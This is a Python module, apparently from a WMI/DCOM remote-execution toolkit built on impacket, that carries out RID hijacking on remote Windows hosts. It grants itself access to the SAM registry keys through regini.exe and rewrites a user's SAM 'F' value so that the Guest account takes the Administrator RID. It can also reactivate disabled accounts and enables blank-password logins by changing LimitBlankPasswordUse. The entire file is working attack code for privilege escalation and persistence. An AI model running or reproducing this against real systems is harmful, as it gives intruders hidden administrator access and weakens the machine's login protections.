import sys
import numpy
import base64
import uuid

from lib.methods.executeVBS import executeVBS_Toolkit
from lib.modules.exec_command import EXEC_COMMAND
from impacket.dcerpc.v5.dtypes import NULL

class RID_Hijack_Toolkit():
    def __init__(self, iWbemLevel1Login, dcom):
        self.iWbemLevel1Login = iWbemLevel1Login
        self.dcom = dcom

    def query_user(self, username):
        iWbemServices = self.iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
        self.iWbemLevel1Login.RemRelease()
        
        try:
            iEnumWbemClassObject = iWbemServices.ExecQuery('SELECT Name, SID, Disabled, PasswordExpires, PasswordChangeable, PasswordRequired FROM Win32_UserAccount where Name="%s"' %username)
            Users_Info = iEnumWbemClassObject.Next(0xffffffff,1)[0]
        except Exception as e:
            if "WBEM_S_FALSE" in str(e):
                print("[-] User not existed!")
            else:
                print("[-] Unexpected error: %s"%str(e))
            self.dcom.disconnect()
            sys.exit(0)
        else:
            print('[+] Get user information: Name: {}, SID: {}, Disabled: {}, PasswordExpires: {}, PasswordChangeable: {}, PasswordRequired: {}'.format(
                Users_Info.Name,
                Users_Info.SID,
                Users_Info.Disabled,
                Users_Info.PasswordExpires,
                Users_Info.PasswordChangeable,
                Users_Info.PasswordRequired
            ))
        iWbemServices.RemRelease()

    def Permissions_Controller(self, action, hijack_Target):
        exec_command = EXEC_COMMAND(self.iWbemLevel1Login)
        regini_Attr =[
            r'HKEY_LOCAL_MACHINE\SAM [1 17]',
            r'HKEY_LOCAL_MACHINE\SAM\SAM [1 17]',
            r'HKEY_LOCAL_MACHINE\SAM\SAM\Domains [1 17]',
            r'HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [1 17]',
            r'HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [1 17]',
            r"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\%s [1 17]"%str(format(int(hex(int(hijack_Target)), 16), '08x'))
        ]

        if "retrieve" in action:
            for i in range(1, len(regini_Attr)): regini_Attr[i] = regini_Attr[i].replace('[1 17]','[17]')

        print("[+] Grant / Restrict user permissions to registry key via regini.exe")
        
        # For old system, if command too long with cause error in Win32_ScheduledJob create method
        # so we need to write batch file on target then execute it.
        if "old" in action:
            ini_Content = ""
            for i in regini_Attr: ini_Content += i + "\r\n"
            ini_FileName = "windows-object-%s.ini"%str(uuid.uuid4())
            with open('./lib/vbscripts/Exec-Command-Silent-UnderNT6-II.vbs') as f: vbs = f.read()
            vbs = vbs.replace("REPLACE_WITH_DEST", r'C:\windows\temp\%s'%ini_FileName).replace("REPLACE_WITH_DATA", base64.b64encode(ini_Content.encode('utf-8')).decode('utf-8')).replace("REPLACE_WITH_COMMAND", r'regini.exe C:\windows\temp\%s'%ini_FileName)
            executer = executeVBS_Toolkit(self.iWbemLevel1Login)
            tag = executer.ExecuteVBS(vbs_content=vbs, returnTag=True)
            exec_command.timer_For_UnderNT6()
            executer.remove_Event(tag)
        else:
            cmd = ""
            for i in regini_Attr: cmd += r'echo %s >> C:\windows\temp\windows.ini && '%i
            cmd += r"regini.exe C:\windows\temp\windows.ini && del /q /f C:\windows\temp\windows.ini"
            exec_command.exec_command_silent(command=cmd)

    # Default is hijacking guest(RID=501) users to administrator(RID=500)
    def hijack(self, action, hijack_Target, hijack_RID=None):
        iWbemServices = self.iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
        self.iWbemLevel1Login.RemRelease()

        iWbemServices2 = self.iWbemLevel1Login.NTLMLogin('//./root/DEFAULT', NULL, NULL)
        StdRegProv, resp = iWbemServices2.GetObject("StdRegProv")

        try: 
            iEnumWbemClassObject = iWbemServices.ExecQuery('SELECT * FROM Win32_UserAccount where SID like "%-{}"'.format(hijack_Target))
            Users_Info = iEnumWbemClassObject.Next(0xffffffff,1)[0]
        except Exception as e:
            if "WBEM_S_FALSE" in str(e):
                print("[-] User with RID: %s not found!"%hijack_Target)
            else:
                print("[-] Unexpected error: %s"%str(e))
            self.dcom.disconnect()
            sys.exit(0)
        
        try:
            raw_value = StdRegProv.GetBinaryValue(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(hijack_Target)), 16), '08x')), 'F')
            len(raw_value.uValue)
        except Exception as e:
            if "NoneType" in str(e):
                print('[-] Looks like we have no permissions to access SAM\\SAM subkeys, please grant full access permissions with: -action "grant" or -action "grant-old" (2003)')
            else:
                print('[-] Unknown error: %s'%(str(e)))
            iWbemServices.RemRelease()
        else:
            # Impacket will return native integer list like this:
            # [3, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255,255, 255, 255, 127, 0, 0, 0, 0, 0, 0, 0, 0, 245, 1, 0, 0, 1, 2, 0, 0, 20, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,0, 0, 0, 52, 0, 52, 0, 0, 0]
            #
            # This is native binary strings, so we need to conver it to this first like this (every four integer add to a list)
            # [03, 00, 01, 00],[00, 00, 00, 00]....
            #
            # Next, reverse the list and combine it, the convert to integer
            # [00, 01, 00, 03] to 00010003(hex) to 65539(int)
            #
            # Finally, to will get a integer list, but the length of the list is less than 80, so we need to append zero until to length is match 80
            raw_value = numpy.array_split(raw_value.uValue, 20)
            result=[]
            for i in raw_value:
                raw = ""
                for j in list(i[::-1]):
                    raw+="%.2x"%j
                result.append(eval("0x{}".format(raw)))
            
            # Appending zero
            result.extend([0]*(80-len(result)))

            # Index 12 is rid
            if action == "hijack":
                result[12] = int(hijack_RID)
                print('[+] Hijacking user from RID: %s to RID: %s'%(hijack_Target, hijack_RID))

            # Enable user index 14 = 532, disable is 533
            elif action == "activate":
                result[14] = 532
                print("[+] Activate target user.")
            elif action == "deactivate":
                result[14] = 533
                print("[+] Deactivate target user.")
            
            StdRegProv.SetBinaryValue(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(hijack_Target)), 16), '08x')), 'F', result)
            iWbemServices.RemRelease()
        
    # For Guest user
    def BlankPasswordLogin(self, action):
        iWbemServices = self.iWbemLevel1Login.NTLMLogin('//./root/DEFAULT', NULL, NULL)
        self.iWbemLevel1Login.RemRelease()
        StdRegProv, resp = iWbemServices.GetObject("StdRegProv")
        if action == "enable":
            StdRegProv.SetDWORDValue(2147483650, 'SYSTEM\\CurrentControlSet\\Control\\Lsa', 'LimitBlankPasswordUse', 0)
            print("[+] Enable blank password login.")
        elif action == "disable":
            StdRegProv.SetDWORDValue(2147483650, 'SYSTEM\\CurrentControlSet\\Control\\Lsa', 'LimitBlankPasswordUse', 1)
            print('[+] Disable blank password login.')
        iWbemServices.RemRelease()